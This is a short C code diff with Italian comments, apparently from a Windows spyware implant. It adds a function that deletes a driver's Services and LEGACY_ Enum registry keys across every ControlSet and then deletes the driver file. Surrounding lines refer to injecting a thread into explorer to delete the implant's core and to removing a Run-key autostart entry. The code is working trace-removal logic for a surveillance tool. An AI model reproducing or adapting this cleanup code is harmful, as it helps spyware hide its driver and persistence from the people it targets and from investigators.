@@ -313,6 +313,36 @@ DWORD HM_RemoveCoreThread(void *dummy)
 	return 1;
 }
 
+// Rimuove il driver dal sistema 
+void HM_RemoveDriver(WCHAR *driver_name)
+{
+	int i;
+	WCHAR *subkey;
+	WCHAR src_drv[MAX_PATH];
+
+	for(i=0;;i++) {
+		// Cicla i profili (tramite i sid)
+		if (!RegEnumSubKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\", i, &subkey))
+			break;
+
+		// Vede se è un ControlSet
+		if (_wcsnicmp(subkey, L"ControlSet", wcslen(L"ControlSet"))) {
+			SAFE_FREE(subkey);
+			continue;
+		}
+
+		// Cancella la chiave e il relativo legacy
+		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"SYSTEM\\%s\\Services\\%s", subkey, driver_name);
+		RegDeleteKeyW(HKEY_LOCAL_MACHINE, src_drv);
+		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"SYSTEM\\%s\\Enum\\Root\\LEGACY_%s", subkey, driver_name);
+		RegDeleteKeyW(HKEY_LOCAL_MACHINE, src_drv);
+
+		SAFE_FREE(subkey);
+	}
+	
+	// Cancella il file del driver
+	RemoveSystemDriver();
+}
 
 // Inietta il thread in explorer per la cancellazione
 // del core. Se explorer non e' attivo, prova a iniettare
@@ -1781,12 +1811,6 @@ void HM_RemoveRegistryKey()
 	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) 
 		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
 #endif
-}
-
-// Fa proprio quello che dice il nome
-void HM_RemoveDriver()
-{
-	UninstallDriver();
 }
 
 // Ritorna il puntatore a dopo una stringa trovata in memoria
